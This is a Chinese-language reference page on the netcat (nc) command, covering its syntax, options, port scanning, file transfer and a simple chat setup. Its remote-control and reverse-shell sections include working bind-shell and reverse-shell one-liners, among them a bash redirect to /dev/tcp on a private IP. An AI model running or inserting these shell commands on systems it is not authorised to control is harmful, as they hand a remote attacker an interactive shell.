# nc

**nc命令** 全称**netcat**，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。

### 语法

```shell
nc [-hlnruz][-g<网关...>][-G<指向器数目>][-i<延迟秒数>][-o<输出文件>][-p<通信端口>]
[-s<来源位址>][-v...][-w<超时秒数>][主机名称][通信端口...]
```

### 选项

```bash
-4 使用 IPv4
-6 使用 IPv6
-b 允许广播
-C 发送 CRLF 作为行结束符
-D 启用调试套接字选项
-d 从 stdin 分离
-F 传递套接字 fd
-h 此帮助文本
-I length TCP 接收缓冲区长度
-i interval 发送行、扫描端口的延迟间隔
-k 保持入站套接字打开以进行多个连接
-l 监听模式，用于入站连接
-M ttl 传出 TTL/跳数限制
-m minttl 最小传入 TTL/跳数限制
-N 在 stdin 上的 EOF 后关闭网络套接字
-n 抑制名称/端口解析
-O length TCP 发送缓冲区长度
-P proxyuser 代理身份验证的用户名
-p port 指定远程连接的本地端口
-q secs 在 stdin 上的 EOF 后退出并延迟 secs
-r 随机化远程端口
-S 启用 TCP MD5 签名选项
-s sourceaddr 本地源地址
-T keyword TOS 值
-t 答案TELNET 协商
-U 使用 UNIX 域套接字
-u UDP 模式
-V rtable 指定备用路由表
-v 详细
-W recvlimit 收到一定数量的数据包后终止
-w timeout 连接和最终网络读取的超时
-X proto 代理协议：“4”、“5”（SOCKS）或“connect”
-x addr[:port] 指定代理地址和端口
-Z DCCP 模式
-z 零 I/O 模式 [用于扫描]
```

### 实例

```bash
# 开启一个端口，比如用作端口转发
nc -lk 9876  &
```

#### **TCP端口扫描**

```bash
# 扫描192.168.0.3 的端口 范围是 1-100
[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 
192.168.0.3: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.3] 80 (http) open
(UNKNOWN) [192.168.0.3] 23 (telnet) open
(UNKNOWN) [192.168.0.3] 22 (ssh) open

# **扫描UDP端口** 扫描192.168.0.3 的端口 范围是 1-1000
[root@localhost ~]# nc -u -z -w2 192.168.0.3 1-1000  
```

‍

#### **扫描指定端口**

```bash
[root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口
(UNKNOWN) [192.168.0.1] 80 (?) open
y  //用户输入
```

查看从服务器到目的地的出站端口 443 是否被防火墙阻止

```bash
nc -vz acme-v02.api.letsencrypt.org 443 -w2
# Ncat: Version 7.50 ( https://nmap.org/ncat )
# Ncat: Connected to 23.77.214.183:443.
# Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.
```

#### **文件传输**

```bash
# 接收方提前设置监听端口与要接收的文件名（文件名可自定义）：
nc -lp 8888 > node.tar.gz

# 传输方发文件：
nc -nv 192.168.75.121 8888  < node_exporter-1.3.1.linux-amd64.tar.gz
# ⚠️ 注意：192.168.75.121是接收方的ip地址。
```

```bash
# 如果希望文件传输结束后自动退出，可以使用下面的命令：
nc -lp 8888 > node.tar.gz
nc -nv 192.168.75.121 8888 -i 1 < node_exporter-1.3.1.linux-amd64.tar.gz
# ⚠️ 注意：-i 表示闲置超时时间
```

#### **远程控制**

```bash
# 正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。
# 被控制端执行下面的命令：
nc -lvnp 8888 -c bash
# 控制端执行下面的命令：
nc 192.168.75.121 8888
```

```bash
# 反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。
# 控制端执行下面的命令：
nc -lvnp 8888
# 被控制端执行下面的命令：
nc 192.168.75.121 8888 -c bash
```

#### **反弹shell**

```bash
# 控制端执行下面的命令：
nc -lvnp 8888
```

```bash
# 被控端执行下面的命令:
bash -i &> /dev/tcp/192.168.75.121/8888 0>&1
```

#### 创建一个简单的聊天服务器

在两个或多个主机之间创建在线聊天的过程与传输文件的方法是基本相同的。

在第一台主机上启动一个 Netcat 进程以侦听端口 5555：

```bash
nc -l 5555
```

在第二台主机上，运行以下命令以连接到侦听端口：

```bash
nc first.host.com 5555
```

现在，如果你键入一条消息并按回车，它将同时显示在两台主机上。

要关闭连接，请键入 `CTRL+C`​。
